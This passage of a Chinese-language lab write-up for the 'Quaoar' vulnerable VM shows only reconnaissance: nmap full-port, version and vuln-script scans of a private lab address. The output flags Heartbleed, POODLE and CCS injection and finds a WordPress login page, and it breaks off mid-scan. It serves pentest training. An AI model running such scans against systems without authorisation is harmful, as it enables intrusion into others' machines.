    <link href="/2023/09/0986fb84a8d0.html"/>
    <url>/2023/09/0986fb84a8d0.html</url>
    
    <content type="html"><![CDATA[<h1 id="Quaoar"><a href="#Quaoar" class="headerlink" title="Quaoar"></a>Quaoar</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.145                                                          <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 02:58 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.145<br>Host is up (0.00022s latency).<br>Not shown: 65526 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br>993/tcp open  imaps<br>995/tcp open  pop3s<br>MAC Address: 08:00:27:A6:AE:F1 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>一如既往这么多端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo nmap -sT -sV -sC -O -p22,53,80,110,139,143,445,993,995 192.168.56.145               <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 02:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.145<br>Host is up (0.00033s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)<br>|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:<span class="hljs-built_in">cd</span>:f1:5e:dc (RSA)<br>|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)<br>53/tcp  open  domain      ISC BIND 9.8.1-P1<br>| dns-nsid: <br>|_  bind.version: 9.8.1-P1<br>80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))<br>| http-robots.txt: 1 disallowed entry <br>|_Hackers<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="hljs-string">110/tcp open  pop3        Dovecot pop3d</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T04:32:43</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T04:32:43</span><br><span class="hljs-string">|_ssl-date: 2023-09-23T15:00:18+00:00; +7h59m59s from scanner time.</span><br><span class="hljs-string">|_pop3-capabilities: PIPELINING STLS RESP-CODES SASL TOP UIDL CAPA</span><br><span class="hljs-string">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="hljs-string">143/tcp open  imap        Dovecot imapd</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T04:32:43</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T04:32:43</span><br><span class="hljs-string">|_imap-capabilities: listed LOGIN-REFERRALS capabilities LITERAL+ ENABLE IMAP4rev1 IDLE OK have STARTTLS post-login Pre-login LOGINDISABLEDA0001 SASL-IR more ID</span><br><span class="hljs-string">|_ssl-date: 2023-09-23T15:00:18+00:00; +7h59m58s from scanner time.</span><br><span class="hljs-string">445/tcp open              Samba smbd 3.6.3 (workgroup: WORKGROUP)</span><br><span class="hljs-string">993/tcp open  ssl/imap    Dovecot imapd</span><br><span class="hljs-string">|_imap-capabilities: listed capabilities LITERAL+ ENABLE IMAP4rev1 IDLE AUTH=PLAINA0001 LOGIN-REFERRALS have post-login Pre-login OK SASL-IR more ID</span><br><span class="hljs-string">|_ssl-date: 2023-09-23T15:00:19+00:00; +7h59m59s from scanner time.</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T04:32:43</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T04:32:43</span><br><span class="hljs-string">995/tcp open  ssl/pop3    Dovecot pop3d</span><br><span class="hljs-string">|_pop3-capabilities: PIPELINING CAPA RESP-CODES SASL(PLAIN) TOP UIDL USER</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T04:32:43</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T04:32:43</span><br><span class="hljs-string">|_ssl-date: 2023-09-23T15:00:19+00:00; +7h59m59s from scanner time.</span><br><span class="hljs-string">MAC Address: 08:00:27:A6:AE:F1 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 2.6.X|3.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br><span class="hljs-string">OS details: Linux 2.6.32 - 3.5</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Unix (Samba 3.6.3)</span><br><span class="hljs-string">|   NetBIOS computer name: </span><br><span class="hljs-string">|   Workgroup: WORKGROUP\x00</span><br><span class="hljs-string">|_  System time: 2023-09-23T11:00:09-04:00</span><br><span class="hljs-string">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="hljs-string">|_clock-skew: mean: 8h39m58s, deviation: 1h37m58s, median: 7h59m58s</span><br><span class="hljs-string">|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统，wordpress 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Quaoar]<br>└─$ sudo nmap --script=vuln -p22,53,80,110,139,143,445,993,995 192.168.56.145               <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 03:03 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.145<br>Host is up (0.00026s latency).<br><br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|   /wordpress/: Blog<br>|   /robots.txt: Robots file<br>|   /wordpress/wp-login.php: Wordpress login page.<br>|_  /upload/: Potentially interesting folder<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">110/tcp open  pop3</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">| ssl-heartbleed: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="hljs-string">|_      http://cvedetails.com/cve/2014-0160/</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">139/tcp open  netbios-ssn</span><br><span class="hljs-string">143/tcp open  imap</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-heartbleed: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="hljs-string">|_      http://cvedetails.com/cve/2014-0160/</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">445/tcp open  microsoft-ds</span><br><span class="hljs-string">993/tcp open  imaps</span><br><span class="hljs-string">| ssl-dh-params: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: Unknown/Custom-generated</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">| ssl-ccs-injection: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="hljs-string">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="hljs-string">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="hljs-string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="hljs-string">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="hljs-string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="hljs-string">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="hljs-string">| ssl-poodle: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   SSL POODLE information leak</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="hljs-string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="hljs-string">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="hljs-string">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="hljs-string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span><br><span class="hljs-string">|     Disclosure date: 2014-10-14</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/70574</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="hljs-string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="hljs-string">|_      https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="hljs-string">| ssl-heartbleed: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="hljs-string">|_      http://cvedetails.com/cve/2014-0160/</span><br><span class="hljs-string">995/tcp open  pop3s</span><br><span class="hljs-string">| ssl-heartbleed: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     Risk factor: High</span><br><span class="hljs-string">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="hljs-string">|           </span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span 